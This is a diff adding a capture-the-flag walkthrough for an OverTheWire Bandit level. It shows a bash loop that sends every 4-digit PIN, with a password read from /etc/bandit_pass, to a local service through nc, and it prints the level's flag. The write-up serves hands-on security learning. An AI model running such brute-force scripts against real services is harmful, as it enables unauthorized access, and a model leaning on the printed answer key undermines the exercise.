@@ -783,15 +783,52 @@ cat password
 
 ## Lvl 24 → 25
 
-**Goal:** 
+**Goal:** The goal of this level is to brute force a 4-digit pincode that must be sent with the bandit24 password to localhost port `30002`.
+
+The first step is to create a temporary folder to work with, and change directory to it.
 
 ```bash
+cd $(mktemp -d)
+```
+Now before creating the script let's try sending the bandit24 password with pincode `0000` just to see the response.
 
+```bash
+echo "$(cat /etc/bandit_pass/bandit24) 0000" | nc localhost 30002
 ```
 
-**Flag:** `` 
+One thing that we can notice is that the response gives us the format that is password + space + pincode and we also notice that when the pincode is wrong the answer contains the keyword `Wrong!`, let's write down a brute-forcing script called `brute-force`.
 
-**Takeaway:** 
+```bash
+vim brute-force
+```
+
+We will start with the `shebang` and the rest will be a for loop that loops all the numbers from `0000` to `9999` combine with the **bandit24 password** and a space.
+
+```bash
+#!/bin/bash
+
+password=$(cat /etc/bandit_pass/bandit24)
+
+for pin in {0000..9999}; do
+    echo "$password $pin"
+done | nc -N localhost 30002 | grep -v "Wrong"
+```
+
+Now let's give the `brute-force` script the right permissions.
+
+```bash
+chmod 700 brute-force
+```
+
+The last step is to execute the script and copy the password for the next level.
+
+```bash
+./brute-force
+```
+
+**Flag:** `iCi86ttT4KSNe1armKiwbQNmB3YJP3q4` 
+
+**Takeaway:** In this level we wrote a more complex script with the goal of brute forcing a 4-digit pin, this is a real plausible attack.
 
 ---
 
